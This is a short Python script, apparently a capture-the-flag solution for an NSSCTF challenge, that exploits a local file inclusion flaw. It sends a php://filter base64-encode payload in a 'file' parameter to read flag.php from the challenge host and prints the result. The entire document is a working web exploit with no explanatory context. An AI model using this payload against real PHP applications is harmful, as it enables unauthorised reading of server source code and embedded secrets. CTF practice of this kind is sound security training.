
import requests

get_data = {"file":"php://filter/convert.base64-encode/resource=flag.php"}

response = requests.get("http://node4.anna.nssctf.cn:28445/",params=get_data)

print(response.text)